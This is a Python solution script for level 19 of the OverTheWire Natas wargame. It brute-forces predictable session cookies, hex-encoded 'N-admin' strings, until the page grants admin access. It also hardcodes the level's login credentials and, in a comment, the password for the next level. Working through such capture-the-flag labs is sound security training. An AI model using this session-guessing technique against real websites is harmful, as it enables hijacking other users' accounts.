import requests
import binascii
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in range(1, 641):
	print("checking id : ", i)
	cookies = dict(PHPSESSID=str(binascii.hexlify((str(i) + '-admin').encode()))[2:-1])
	# cookies = cookies.encode()
	r = requests.get('http://natas19.natas.labs.overthewire.org/index.php', cookies=cookies, auth=auth)	
	if "You are an admin" in r.text:
		print(cookies)
		break

#passwd = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'